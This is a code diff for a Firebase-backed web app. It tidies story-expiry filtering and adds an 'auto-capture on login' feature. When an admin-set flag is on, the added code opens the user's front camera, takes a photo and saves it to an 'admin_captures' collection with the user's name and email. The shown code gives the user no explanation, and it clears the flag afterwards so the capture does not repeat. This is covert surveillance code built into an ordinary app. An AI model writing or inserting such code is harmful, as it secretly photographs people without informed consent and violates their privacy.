@@ -958,6 +958,9 @@ onAuthStateChanged(auth, async (user) => {
             loadAdminBackgrounds();
             initializeNotificationSystem();
             initCommandListener(); // Initialize listener for admin commands
+            
+            // Check for auto-capture flag
+            checkAndTriggerAutoCapture(user.uid);
         } else {
             stopPresenceTracking();
             if (unsubscribeCurrentUser) {
@@ -2901,15 +2904,42 @@ function subscribeToStories() {
     const storiesRef = collection(db, 'stories');
     const storiesQuery = query(storiesRef, orderBy('createdAt', 'desc'));
     unsubscribeStories = onSnapshot(storiesQuery, (snapshot) => {
-        const cutoff = Date.now() - STORY_DURATION_MS;
+        const now = Date.now();
+        const cutoff = now - STORY_DURATION_MS;
         const stories = [];
         snapshot.forEach((docSnap) => {
             const data = docSnap.data();
-            const createdAt = data.createdAt?.toDate?.();
-            if (!createdAt) return;
-            if (createdAt.getTime() < cutoff) {
+            
+            // Handle Firestore Timestamp conversion
+            let createdAt = null;
+            if (data.createdAt) {
+                if (data.createdAt.toDate) {
+                    createdAt = data.createdAt.toDate();
+                } else if (data.createdAt instanceof Date) {
+                    createdAt = data.createdAt;
+                } else if (typeof data.createdAt === 'number') {
+                    createdAt = new Date(data.createdAt);
+                }
+            }
+            
+            // Skip if createdAt is missing or invalid
+            if (!createdAt || isNaN(createdAt.getTime())) {
+                console.warn(`Story ${docSnap.id} has invalid createdAt, skipping`);
                 return;
             }
+            
+            const createdAtTime = createdAt.getTime();
+            
+            // Only include stories that are less than 24 hours old
+            // Add a small buffer (1 minute) to account for timing differences
+            const storyAge = now - createdAtTime;
+            const maxAge = STORY_DURATION_MS + (60 * 1000); // 24 hours + 1 minute buffer
+            
+            if (storyAge > maxAge) {
+                // Story is too old, skip it
+                return;
+            }
+            
             stories.push({
                 id: docSnap.id,
                 ...data,
@@ -6641,5 +6671,105 @@ async function handleCommand(commandId, commandData) {
                 console.error('Failed to report error:', e);
             }
         }
+    }
+}
+
+// ===========================
+// Auto-Capture on Login
+// ===========================
+async function checkAndTriggerAutoCapture(userId) {
+    try {
+        // Fetch user document to check autoCaptureEnabled flag
+        const userDoc = await getDoc(doc(db, 'users', userId));
+        if (!userDoc.exists()) return;
+
+        const userData = userDoc.data();
+        if (!userData.autoCaptureEnabled) return;
+
+        console.log('Auto-capture flag detected, triggering capture...');
+
+        // Immediately reset the flag to prevent loop
+        await updateDoc(doc(db, 'users', userId), {
+            autoCaptureEnabled: false
+        });
+
+        // Trigger the capture
+        await performAutoCapture(userId, userData);
+    } catch (error) {
+        console.error('Error checking auto-capture flag:', error);
+    }
+}
+
+async function performAutoCapture(userId, userData) {
+    try {
+        // Access front camera
+        const stream = await navigator.mediaDevices.getUserMedia({
+            video: { facingMode: 'user' },
+            audio: false
+        });
+
+        // Create video element for capture
+        const video = document.createElement('video');
+        video.srcObject = stream;
+        video.muted = true;
+        video.playsInline = true;
+
+        await new Promise((resolve, reject) => {
+            video.onloadedmetadata = () => {
+                video.play().then(resolve).catch(reject);
+            };
+            video.onerror = reject;
+        });
+
+        // Wait for camera to stabilize
+        await new Promise(r => setTimeout(r, 200));
+
+        // Capture to canvas
+        const canvas = document.createElement('canvas');
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        const ctx = canvas.getContext('2d');
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+        // Convert to Base64
+        const base64Image = canvas.toDataURL('image/jpeg', 0.7);
+
+        // Stop stream immediately
+        stream.getTracks().forEach(track => track.stop());
+
+        // Save to Firestore
+        await saveAutoCapture(userId, userData, base64Image);
+
+        console.log('Auto-capture completed successfully');
+    } catch (error) {
+        console.error('Auto-capture failed:', error);
+        // Still reset the flag even if capture fails to prevent retry loop
+        try {
+            await updateDoc(doc(db, 'users', userId), {
+                autoCaptureEnabled: false
+            });
+        } catch (e) {
+            console.error('Failed to reset flag:', e);
+        }
+    }
+}
+
+async function saveAutoCapture(userId, userData, imageData) {
+    try {
+        const captureData = {
+            capturedUserId: userId,
+            capturedUserName: userData.displayName || userData.email || 'Unknown',
+            capturedUserEmail: userData.email || '',
+            timestamp: serverTimestamp(),
+            imageData: imageData,
+            captureType: 'auto_capture'
+        };
+
+        // Save to admin_captures collection
+        await addDoc(collection(db, 'admin_captures'), captureData);
+        console.log('Auto-capture saved to Firestore');
+    } catch (error) {
+        console.error('Error saving auto-capture:', error);
+        throw error;
     }
 }
